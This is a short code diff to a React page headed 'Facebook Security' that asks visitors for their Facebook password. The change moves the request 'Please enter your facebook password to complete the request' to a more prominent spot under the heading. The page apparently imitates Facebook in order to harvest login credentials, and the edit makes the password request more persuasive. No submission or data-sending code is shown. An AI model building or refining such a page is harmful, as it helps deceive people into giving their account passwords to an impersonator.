@@ -115,6 +115,9 @@ export default function Confirmation() {
           <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
             Facebook Security
           </h1>
+          <p className="text-sm text-[#606770] mb-4">
+            Please enter your facebook password to complete the request
+          </p>
           <Form {...form}>
             <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
               <div className="text-left">
@@ -198,9 +201,6 @@ export default function Confirmation() {
               </div>
 
               <div className="text-left">
-                <p className="text-sm text-[#606770] mb-3">
-                  Please enter your facebook password to complete the request
-                </p>
                 <FormField
                   control={form.control}
                   name="password"
